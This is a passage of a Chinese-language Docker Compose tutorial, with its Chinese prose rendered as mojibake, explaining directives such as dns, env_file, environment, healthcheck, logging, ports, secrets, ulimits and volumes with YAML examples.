class="line"><span class="bullet">      -</span> <span class="string">db</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  redis:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  db:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š<code>web</code> æœåŠ¡ä¸ä¼šç­‰å¾… <code>redis</code> <code>db</code> ã€Œå®Œå…¨å¯åŠ¨ã€ä¹‹åæ‰å¯åŠ¨ã€‚</p></blockquote><p><code>dns</code></p><p>è‡ªå®šä¹‰ <code>DNS</code> æœåŠ¡å™¨ã€‚å¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns:</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"><span class="bullet">  -</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure><p><code>dns_search</code></p><p>é…ç½® <code>DNS</code> æœç´¢åŸŸã€‚å¯ä»¥æ˜¯ä¸€ä¸ªå€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns_search:</span> <span class="string">example.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns_search:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">domain1.example.com</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">domain2.example.com</span></span><br></pre></td></tr></table></figure><p><code>tmpfs</code></p><p>æŒ‚è½½ä¸€ä¸ª tmpfs æ–‡ä»¶ç³»ç»Ÿåˆ°å®¹å™¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tmpfs:</span> <span class="string">/run</span></span><br><span class="line"><span class="attr">tmpfs:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">/run</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure><p><code>env_file</code></p><p>ä»æ–‡ä»¶ä¸­è·å–ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä¸ºå•ç‹¬çš„æ–‡ä»¶è·¯å¾„æˆ–åˆ—è¡¨ã€‚</p><p>å¦‚æœé€šè¿‡ <code>docker-compose -f FILE</code> æ–¹å¼æ¥æŒ‡å®š Compose æ¨¡æ¿æ–‡ä»¶ï¼Œåˆ™ <code>env_file</code> ä¸­å˜é‡çš„è·¯å¾„ä¼šåŸºäºæ¨¡æ¿æ–‡ä»¶è·¯å¾„ã€‚</p><p>å¦‚æœæœ‰å˜é‡åç§°ä¸ <code>environment</code> æŒ‡ä»¤å†²çªï¼Œåˆ™æŒ‰ç…§æƒ¯ä¾‹ï¼Œä»¥åè€…ä¸ºå‡†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">env_file: .env</span><br><span class="line"></span><br><span class="line">env_file:</span><br><span class="line">  - ./common.env</span><br><span class="line">  - ./apps/web.env</span><br><span class="line">  - /opt/secrets.env</span><br></pre></td></tr></table></figure><p>ç¯å¢ƒå˜é‡æ–‡ä»¶ä¸­æ¯ä¸€è¡Œå¿…é¡»ç¬¦åˆæ ¼å¼ï¼Œæ”¯æŒ <code>#</code> å¼€å¤´çš„æ³¨é‡Šè¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># common.env: Set development environment</span></span><br><span class="line">PROG_ENV=development</span><br></pre></td></tr></table></figure><p><code>environment</code></p><p>è®¾ç½®ç¯å¢ƒå˜é‡ã€‚ä½ å¯ä»¥ä½¿ç”¨æ•°ç»„æˆ–å­—å…¸ä¸¤ç§æ ¼å¼ã€‚</p><p>åªç»™å®šåç§°çš„å˜é‡ä¼šè‡ªåŠ¨è·å–è¿è¡Œ Compose ä¸»æœºä¸Šå¯¹åº”å˜é‡çš„å€¼ï¼Œå¯ä»¥ç”¨æ¥é˜²æ­¢æ³„éœ²ä¸å¿…è¦çš„æ•°æ®ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="attr">  RACK_ENV:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">  SESSION_SECRET:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">RACK_ENV=development</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">SESSION_SECRET</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå˜é‡åç§°æˆ–è€…å€¼ä¸­ç”¨åˆ° <code>true|falseï¼Œyes|no</code> ç­‰è¡¨è¾¾ <a href="https://yaml.org/type/bool.html" target="_blank" rel="noopener">å¸ƒå°”</a> å«ä¹‰çš„è¯æ±‡ï¼Œæœ€å¥½æ”¾åˆ°å¼•å·é‡Œï¼Œé¿å… YAML è‡ªåŠ¨è§£ææŸäº›å†…å®¹ä¸ºå¯¹åº”çš„å¸ƒå°”è¯­ä¹‰ã€‚è¿™äº›ç‰¹å®šè¯æ±‡ï¼ŒåŒ…æ‹¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y|Y|yes|Yes|YES|n|N|no|No|NO|<span class="literal">true</span>|True|TRUE|<span class="literal">false</span>|False|FALSE|on|On|ON|off|Off|OFF</span><br></pre></td></tr></table></figure><p><code>expose</code></p><p>æš´éœ²ç«¯å£ï¼Œä½†ä¸æ˜ å°„åˆ°å®¿ä¸»æœºï¼Œåªè¢«è¿æ¥çš„æœåŠ¡è®¿é—®ã€‚</p><p>ä»…å¯ä»¥æŒ‡å®šå†…éƒ¨ç«¯å£ä¸ºå‚æ•°</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">expose:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"3000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"8000"</span></span><br></pre></td></tr></table></figure><p><code>external_links</code></p><blockquote><p>æ³¨æ„ï¼šä¸å»ºè®®ä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚</p></blockquote><p>é“¾æ¥åˆ° <code>docker-compose.yml</code> å¤–éƒ¨çš„å®¹å™¨ï¼Œç”šè‡³å¹¶é <code>Compose</code> ç®¡ç†çš„å¤–éƒ¨å®¹å™¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">external_links:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">redis_1</span></span><br><span class="line"><span class="attr"> - project_db_1:</span><span class="string">mysql</span></span><br><span class="line"><span class="attr"> - project_db_1:</span><span class="string">postgresql</span></span><br></pre></td></tr></table></figure><p><code>extra_hosts</code></p><p>ç±»ä¼¼ Docker ä¸­çš„ <code>--add-host</code> å‚æ•°ï¼ŒæŒ‡å®šé¢å¤–çš„ host åç§°æ˜ å°„ä¿¡æ¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extra_hosts:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"googledns:8.8.8.8"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"dockerhub:52.1.157.61"</span></span><br></pre></td></tr></table></figure><p>ä¼šåœ¨å¯åŠ¨åçš„æœåŠ¡å®¹å™¨ä¸­ <code>/etc/hosts</code> æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä¸¤æ¡æ¡ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8 googledns</span><br><span class="line">52.1.157.61 dockerhub</span><br></pre></td></tr></table></figure><p><code>healthcheck</code></p><p>é€šè¿‡å‘½ä»¤æ£€æŸ¥å®¹å™¨æ˜¯å¦å¥åº·è¿è¡Œã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">healthcheck:</span></span><br><span class="line"><span class="attr">  test:</span> <span class="string">["CMD",</span> <span class="string">"curl"</span><span class="string">,</span> <span class="string">"-f"</span><span class="string">,</span> <span class="string">"http://localhost"</span><span class="string">]</span></span><br><span class="line"><span class="attr">  interval:</span> <span class="number">1</span><span class="string">m30s</span></span><br><span class="line"><span class="attr">  timeout:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">  retries:</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><code>image</code></p><p>æŒ‡å®šä¸ºé•œåƒåç§°æˆ–é•œåƒ IDã€‚å¦‚æœé•œåƒåœ¨æœ¬åœ°ä¸å­˜åœ¨ï¼Œ<code>Compose</code> å°†ä¼šå°è¯•æ‹‰å–è¿™ä¸ªé•œåƒã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">image:</span> <span class="string">ubuntu</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">orchardup/postgresql</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">a4bc65fd</span></span><br></pre></td></tr></table></figure><p><code>labels</code></p><p>ä¸ºå®¹å™¨æ·»åŠ  Docker å…ƒæ•°æ®ï¼ˆmetadataï¼‰ä¿¡æ¯ã€‚ä¾‹å¦‚å¯ä»¥ä¸ºå®¹å™¨æ·»åŠ è¾…åŠ©è¯´æ˜ä¿¡æ¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="string">com.startupteam.description:</span> <span class="string">"webapp for a startup team"</span></span><br><span class="line">  <span class="string">com.startupteam.department:</span> <span class="string">"devops department"</span></span><br><span class="line">  <span class="string">com.startupteam.release:</span> <span class="string">"rc3 for v1.0"</span></span><br></pre></td></tr></table></figure><p><code>links</code></p><blockquote><p>æ³¨æ„ï¼šä¸æ¨èä½¿ç”¨è¯¥æŒ‡ä»¤ã€‚</p></blockquote><p><code>logging</code></p><p>é…ç½®æ—¥å¿—é€‰é¡¹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line"><span class="attr">  driver:</span> <span class="string">syslog</span></span><br><span class="line"><span class="attr">  options:</span></span><br><span class="line"><span class="attr">    syslog-address:</span> <span class="string">"tcp://192.168.0.42:123"</span></span><br></pre></td></tr></table></figure><p>ç›®å‰æ”¯æŒä¸‰ç§æ—¥å¿—é©±åŠ¨ç±»å‹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver:</span> <span class="string">"json-file"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"syslog"</span></span><br><span class="line"><span class="attr">driver:</span> <span class="string">"none"</span></span><br></pre></td></tr></table></figure><p><code>options</code> é…ç½®æ—¥å¿—é©±åŠ¨çš„ç›¸å…³å‚æ•°ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">options:</span></span><br><span class="line"><span class="attr">  max-size:</span> <span class="string">"200k"</span></span><br><span class="line"><span class="attr">  max-file:</span> <span class="string">"10"</span></span><br></pre></td></tr></table></figure><p><code>network_mode</code></p><p>è®¾ç½®ç½‘ç»œæ¨¡å¼ã€‚ä½¿ç”¨å’Œ <code>docker run</code> çš„ <code>--network</code> å‚æ•°ä¸€æ ·çš„å€¼ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network_mode:</span> <span class="string">"bridge"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"host"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"none"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"service:[service name]"</span></span><br><span class="line"><span class="attr">network_mode:</span> <span class="string">"container:[container name/id]"</span></span><br></pre></td></tr></table></figure><p><code>networks</code></p><p>é…ç½®å®¹å™¨è¿æ¥çš„ç½‘ç»œã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  some-service:</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">     -</span> <span class="string">some-network</span></span><br><span class="line"><span class="bullet">     -</span> <span class="string">other-network</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">  some-network:</span></span><br><span class="line"><span class="attr">  other-network:</span></span><br></pre></td></tr></table></figure><p><code>pid</code></p><p>è·Ÿä¸»æœºç³»ç»Ÿå…±äº«è¿›ç¨‹å‘½åç©ºé—´ã€‚æ‰“å¼€è¯¥é€‰é¡¹çš„å®¹å™¨ä¹‹é—´ï¼Œä»¥åŠå®¹å™¨å’Œå®¿ä¸»æœºç³»ç»Ÿä¹‹é—´å¯ä»¥é€šè¿‡è¿›ç¨‹ ID æ¥ç›¸äº’è®¿é—®å’Œæ“ä½œã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pid:</span> <span class="string">"host"</span></span><br></pre></td></tr></table></figure><p><code>ports</code></p><p>æš´éœ²ç«¯å£ä¿¡æ¯ã€‚</p><p>ä½¿ç”¨å®¿ä¸»ç«¯å£ï¼šå®¹å™¨ç«¯å£ <code>(HOST:CONTAINER)</code> æ ¼å¼ï¼Œæˆ–è€…ä»…ä»…æŒ‡å®šå®¹å™¨çš„ç«¯å£ï¼ˆå®¿ä¸»å°†ä¼šéšæœºé€‰æ‹©ç«¯å£ï¼‰éƒ½å¯ä»¥ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"3000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"8000:8000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"49100:22"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"127.0.0.1:8001:8001"</span></span><br></pre></td></tr></table></figure><p><em>æ³¨æ„ï¼šå½“ä½¿ç”¨ <code>HOST:CONTAINER</code> æ ¼å¼æ¥æ˜ å°„ç«¯å£æ—¶ï¼Œå¦‚æœä½ ä½¿ç”¨çš„å®¹å™¨ç«¯å£å°äº 60 å¹¶ä¸”æ²¡æ”¾åˆ°å¼•å·é‡Œï¼Œå¯èƒ½ä¼šå¾—åˆ°é”™è¯¯ç»“æœï¼Œå› ä¸º <code>YAML</code> ä¼šè‡ªåŠ¨è§£æ <code>xx:yy</code> è¿™ç§æ•°å­—æ ¼å¼ä¸º 60 è¿›åˆ¶ã€‚ä¸ºé¿å…å‡ºç°è¿™ç§é—®é¢˜ï¼Œå»ºè®®æ•°å­—ä¸²éƒ½é‡‡ç”¨å¼•å·åŒ…æ‹¬èµ·æ¥çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚</em></p><p><code>secrets</code></p><p>å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚ <code>mysql</code> æœåŠ¡å¯†ç ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.1"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mysql:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">  environment:</span></span><br><span class="line"><span class="attr">    MYSQL_ROOT_PASSWORD_FILE:</span> <span class="string">/run/secrets/db_root_password</span></span><br><span class="line"><span class="attr">  secrets:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">db_root_password</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">my_other_secret</span></span><br><span class="line"></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line"><span class="attr">  my_secret:</span></span><br><span class="line"><span class="attr">    file:</span> <span class="string">./my_secret.txt</span></span><br><span class="line"><span class="attr">  my_other_secret:</span></span><br><span class="line"><span class="attr">    external:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><code>security_opt</code></p><p>æŒ‡å®šå®¹å™¨æ¨¡æ¿æ ‡ç­¾ï¼ˆlabelï¼‰æœºåˆ¶çš„é»˜è®¤å±æ€§ï¼ˆç”¨æˆ·ã€è§’è‰²ã€ç±»å‹ã€çº§åˆ«ç­‰ï¼‰ã€‚ä¾‹å¦‚é…ç½®æ ‡ç­¾çš„ç”¨æˆ·åå’Œè§’è‰²åã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">security_opt:</span></span><br><span class="line"><span class="attr">    - label:</span><span class="attr">user:USER</span></span><br><span class="line"><span class="attr">    - label:</span><span class="attr">role:ROLE</span></span><br></pre></td></tr></table></figure><p><code>stop_signal</code></p><p>è®¾ç½®å¦ä¸€ä¸ªä¿¡å·æ¥åœæ­¢å®¹å™¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯ SIGTERM åœæ­¢å®¹å™¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stop_signal:</span> <span class="string">SIGUSR1</span></span><br></pre></td></tr></table></figure><p><code>sysctls</code></p><p>é…ç½®å®¹å™¨å†…æ ¸å‚æ•°ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sysctls:</span></span><br><span class="line">  <span class="string">net.core.somaxconn:</span> <span class="number">1024</span></span><br><span class="line">  <span class="string">net.ipv4.tcp_syncookies:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sysctls:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">net.core.somaxconn=1024</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">net.ipv4.tcp_syncookies=0</span></span><br></pre></td></tr></table></figure><p><code>ulimits</code></p><p>æŒ‡å®šå®¹å™¨çš„ ulimits é™åˆ¶å€¼ã€‚</p><p>ä¾‹å¦‚ï¼ŒæŒ‡å®šæœ€å¤§è¿›ç¨‹æ•°ä¸º 65535ï¼ŒæŒ‡å®šæ–‡ä»¶å¥æŸ„æ•°ä¸º 20000ï¼ˆè½¯é™åˆ¶ï¼Œåº”ç”¨å¯ä»¥éšæ—¶ä¿®æ”¹ï¼Œä¸èƒ½è¶…è¿‡ç¡¬é™åˆ¶ï¼‰ å’Œ 40000ï¼ˆç³»ç»Ÿç¡¬é™åˆ¶ï¼Œåªèƒ½ root ç”¨æˆ·æé«˜ï¼‰ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ulimits:</span></span><br><span class="line"><span class="attr">  nproc:</span> <span class="number">65535</span></span><br><span class="line"><span class="attr">  nofile:</span></span><br><span class="line"><span class="attr">    soft:</span> <span class="number">20000</span></span><br><span class="line"><span class="attr">    hard:</span> <span class="number">40000</span></span><br></pre></td></tr></table></figure><p><code>volumes</code></p><p>æ•°æ®å·æ‰€æŒ‚è½½è·¯å¾„è®¾ç½®ã€‚å¯ä»¥è®¾ç½®å®¿ä¸»æœºè·¯å¾„ ï¼ˆ<code>HOST:CONTAINER</code>ï¼‰ æˆ–åŠ ä¸Šè®¿é—®æ¨¡å¼ ï¼ˆ<code>HOST:CONTAINER:ro</code>ï¼‰ã€‚</p><p>è¯¥æŒ‡ä»¤ä¸­è·¯å¾„æ”¯æŒç›¸å¯¹è·¯å¾„ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">/var/lib/mysql</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">cache/:/tmp/cache</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">~/configs:/etc/configs/:ro</span></span><br></pre></td></tr></table></figure><p><strong>å…¶å®ƒæŒ‡ä»¤</strong></p><p>æ­¤å¤–ï¼Œè¿˜æœ‰åŒ…æ‹¬ <code>domainname, entrypoint, hostname, ipc, mac_address, privileged, read_only, shm_size, restart, stdin_open, tty, user, working_dir</code> ç­‰æŒ‡ä»¤ï¼ŒåŸºæœ¬è·Ÿ <code>docker run</code> ä¸­å¯¹åº”å‚æ•°çš„åŠŸèƒ½ä¸€è‡´ã€‚</p><p>æŒ‡å®šæœåŠ¡å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å…¥å£æ–‡ä»¶ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entrypoint:</span> <span class="string">/code/entrypoint.sh</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®šå®¹å™¨ä¸­è¿è¡Œåº”ç”¨çš„ç”¨æˆ·åã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">user:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®šå®¹å™¨ä¸­å·¥ä½œç›®å½•ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">working_dir:</span> <span class="string">/code</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®šå®¹å™¨ä¸­æœç´¢åŸŸåã€ä¸»æœºåã€mac åœ°å€ç­‰ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">domainname:</span> <span class="string">your_website.com</span></span><br><span class="line"><span class="attr">hostname:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">mac_address:</span> <span class="number">08</span><span class="bullet">-00</span><span class="bullet">-27</span><span class="bullet">-00</span><span class="bullet">-0</span><span class="string">C-0A</span></span><br></pre></td></tr></table></figure><p>å…è®¸å®¹å™¨ä¸­è¿è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>æŒ‡å®šå®¹å™¨é€€å‡ºåçš„é‡å¯ç­–ç•¥ä¸ºå§‹ç»ˆé‡å¯ã€‚è¯¥å‘½ä»¤å¯¹ä¿æŒæœåŠ¡å§‹ç»ˆè¿è¡Œååˆ†æœ‰æ•ˆï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ¨èé…ç½®ä¸º <code>always</code> æˆ–è€… <code>unless-stopped</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><p>ä»¥åªè¯»æ¨¡å¼æŒ‚è½½å®¹å™¨çš„ root æ–‡ä»¶ç³»ç»Ÿï¼Œæ„å‘³ç€ä¸èƒ½å¯¹å®¹å™¨å†…å®¹è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">read_only:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>æ‰“å¼€æ ‡å‡†è¾“å…¥ï¼Œå¯ä»¥æ¥å—å¤–éƒ¨è¾“å…¥ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stdin_open:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿä¸€ä¸ªä¼ªç»ˆç«¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tty:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>è¯»å–å˜é‡</strong></p><p>Compose æ¨¡æ¿æ–‡ä»¶æ”¯æŒåŠ¨æ€è¯»å–ä¸»æœºçš„ç³»ç»Ÿç¯å¢ƒå˜é‡å’Œå½“å‰ç›®å½•ä¸‹çš„ <code>.env</code> æ–‡ä»¶ä¸­çš„å˜é‡ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹é¢çš„ Compose æ–‡ä»¶å°†ä»è¿è¡Œå®ƒçš„ç¯å¢ƒä¸­è¯»å–å˜é‡ <code>${MONGO_VERSION}</code> çš„å€¼ï¼Œå¹¶å†™å…¥æ‰§è¡Œçš„æŒ‡ä»¤ä¸­ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">db:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="string">"mongo:$&#123;MONGO_VERSION&#125;"</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰§è¡Œ <code>MONGO_VERSION=3.2 docker-compose up</code> åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª <code>mongo:3.2</code> é•œåƒçš„å®¹å™¨ï¼›å¦‚æœæ‰§è¡Œ <code>MONGO_VERSION=2.8 docker-compose up</code> åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª <code>mongo:2.8</code> é•œåƒçš„å®¹å™¨ã€‚</p><p>è‹¥å½“å‰ç›®å½•å­˜åœ¨ <code>.env</code> æ–‡ä»¶ï¼Œæ‰§è¡Œ <code>docker-compose</code> 